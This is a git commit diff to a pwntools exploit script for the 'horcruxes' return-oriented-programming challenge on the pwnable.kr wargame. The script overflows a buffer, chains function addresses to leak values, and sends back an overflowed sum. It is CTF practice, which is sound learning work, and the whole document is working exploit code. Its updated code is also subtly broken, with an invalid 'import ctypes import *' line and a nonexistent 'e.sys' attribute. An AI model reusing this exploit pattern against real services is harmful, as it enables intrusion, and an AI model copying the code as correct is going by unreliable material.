7ff617ae443f9f26aeecda95c948c58eb8a4cbba
Kyeonghwan Min <baksa1849@gmail.com>
2021-03-26 21:50:41 +0900

    Update horcruxes.py

--- 3. Return Oriented Programming/horcruxes.py
+++ 3. Return Oriented Programming/horcruxes.py
@@ -1,32 +1,37 @@
 from pwn import *
 import ctypes import *
 
-shell = ssh('horcruxes' ,'pwnable.kr' ,password='guest', port=2222)
-process = shell.run("nc 0 9032")
+e = ELF('./horcruxes')
+
+# remote open
+process = remote('pwnable.kr', 9032)
 
 process.recvuntil("Menu:")
 process.sendline("1")
 process.recvuntil("earned? : ")
 
+# Payload Part
 payload = b"A" * 120
-payload += p32(0x809fe4b) # A
-payload += p32(0x809fe6a) # B
-payload += p32(0x809fe89) # C
-payload += p32(0x809fea8) # D
-payload += p32(0x809fec7) # E
-payload += p32(0x809fee6) # F
-payload += p32(0x809ff05) # G
-payload += p32(0x809fffc) # Call ropme
+payload += p32(e.sys.A) # Function A's Address
+payload += p32(e.sys.B) # Function B's Address
+payload += p32(e.sys.C) # Function C's Address
+payload += p32(e.sys.D) # Function D's Address
+payload += p32(e.sys.E) # Function E's Address
+payload += p32(e.sys.F) # Function F's Address
+payload += p32(e.sys.G) # Function G's Address
+payload += p32(e.sys.main + 0xD8) # Calling "ropme()" Address
 
 process.sendline(payload)
 
 sum = 0
 
+# Get the value of each A ~ G
 for i in range(7):
     print(process.recvuntil("EXP +").decode())
     sum += int(process.recvuntil(")")[:-1])
     log.info("sum = " + str(sum))
 
+# Overflow handling using c_int class
 ovsum = c_int(sum)
 
 process.recvuntil("Menu:")
@@ -37,4 +42,3 @@ process.sendline(str(ovsum))
 log.info(process.recvall())
 
 process.close()
-shell.close()
